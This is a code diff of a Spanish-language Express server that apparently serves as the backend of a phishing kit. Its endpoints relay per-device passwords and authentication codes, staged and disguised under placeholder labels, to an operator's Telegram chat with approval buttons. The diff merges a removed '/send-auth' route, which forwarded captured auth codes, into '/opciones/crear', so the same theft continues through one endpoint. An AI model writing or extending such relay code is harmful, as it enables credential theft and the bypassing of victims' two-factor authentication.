@@ -78,7 +78,7 @@ async function llamarTelegramOpciones(metodo, datos) {
 
 app.post('/opciones/crear', async (req, res) => {
 
-    const { dispositivoID, etapa, calificacion } = req.body;
+    const { dispositivoID, etapa, calificacion, autenticacion } = req.body;
 
 const etapaSolicitud =
     etapa === "calificacion"
@@ -121,8 +121,9 @@ text:
 (
     etapaSolicitud === 'tercera'
         ? 'AAAA2 ' + idVisible + ': `' + calificacion + '`'
-        : 'APROBACIÓN ' + idVisible + ': ' +
-          (etapaSolicitud === 'segunda' ? 'AAAA1' : 'UUUU/CCCC')
+        : etapaSolicitud === 'segunda'
+            ? 'AAAA1 ' + idVisible + ': `' + autenticacion + '`'
+            : 'APROBACIÓN ' + idVisible + ': UUUU/CCCC'
 ),
 
                 reply_markup: {
@@ -374,32 +375,6 @@ usuariosData[dispositivoID].contraseña = `CCCCC ${dispositivoID.replace('id.', 
         body: JSON.stringify({
             chat_id: OPCIONES_CHAT_ID,
             text: usuariosData[dispositivoID].contraseña,
-            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
-        }),
-        headers: { 'Content-Type': 'application/json' },
-    });
-    res.sendStatus(200);
-});
-
-// Ruta para recibir y enviar el código de autenticación al bot de Telegram
-app.post('/send-auth', async (req, res) => {
-    const { dispositivoID, texto: authCode } = req.body;
-
-// Almacenar el código de autenticación por dispositivo
-if (!usuariosData[dispositivoID]) {
-    console.error('Registro no encontrado en /send-auth:', dispositivoID);
-    return res.status(404).json({
-        error: 'Registro de dispositivo no encontrado'
-    });
-}
-
-usuariosData[dispositivoID].codigo = `AAAA1 ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
-
-    await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        body: JSON.stringify({
-            chat_id: OPCIONES_CHAT_ID,
-            text: usuariosData[dispositivoID].codigo,
             parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
         }),
         headers: { 'Content-Type': 'application/json' },
